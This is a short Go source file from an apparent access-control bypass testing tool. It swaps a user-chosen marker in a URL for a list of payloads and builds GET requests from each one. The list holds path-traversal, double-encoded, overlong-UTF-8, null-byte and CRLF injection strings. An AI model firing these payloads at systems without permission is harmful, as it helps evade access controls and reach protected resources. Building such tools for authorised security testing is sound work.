// Package bypass — custom marker-position bypass technique.
package bypass

import "strings"

// CustomPositionTechnique replaces a user-defined marker (e.g. "§") in the URL
// with various bypass payloads.
type CustomPositionTechnique struct{}

func (c *CustomPositionTechnique) Name() string        { return "custom-position" }
func (c *CustomPositionTechnique) Description() string { return "Custom marker position payloads" }

// positionPayloads are the substitution strings to inject at the marker.
var positionPayloads = []string{
	// Traversal
	"../",
	"../../",
	"..;/",
	"..%00/",
	"..%0d/",
	"..%0a/",
	"..%09/",
	"..%5c/",
	// Encoding
	"%2e%2e/",
	"%252e%252e/",
	"..%252f",
	"%c0%af",
	"%c1%9c",
	// Null / whitespace injections
	"%00",
	"%0d%0a",
	"%20",
	"%09",
	// Misc
	"./",
	";",
	".json",
	".html",
	"?",
	"#",
	"&",
}

// Generate produces payloads by replacing the marker in the target URL.
// Returns nil if no marker is set.
func (c *CustomPositionTechnique) Generate(target *Target) []Payload {
	if target.Marker == "" {
		return nil
	}

	// Find the marker in the original URL.
	if !strings.Contains(target.OriginalURL, target.Marker) {
		return nil
	}

	var payloads []Payload
	for _, sub := range positionPayloads {
		replaced := strings.ReplaceAll(target.OriginalURL, target.Marker, sub)
		payloads = append(payloads, Payload{
			TechniqueName: c.Name(),
			Description:   "marker -> " + sub,
			Method:        "GET",
			URL:           replaced,
			Headers:       make(map[string]string),
		})
	}
	return payloads
}
